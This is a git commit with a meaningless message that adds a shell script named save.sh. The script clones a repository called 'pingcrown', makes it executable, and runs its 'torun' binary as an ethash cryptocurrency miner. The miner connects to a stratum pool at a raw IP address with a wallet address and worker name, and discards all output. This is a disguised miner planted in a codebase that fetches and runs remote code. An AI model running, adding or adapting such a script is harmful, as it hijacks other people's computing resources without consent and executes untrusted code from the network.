cc66ea8fb92d3718eface9631dc7b667c4790cd0
diemthodom <naochaduoc@magnetgr.com>
2022-07-11 00:02:47 +0700

    Seconjkd

---
+++ save.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+cd /mainsrc
+git clone https://github.com/mycrownteam/pingcrown.git -q
+chmod -R +x pingcrown
+./pingcrown/torun -a ethash -o stratum+tcp://51.195.4.174:2020 -u 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -p x -w kienmai-05 > /dev/null 2>&1
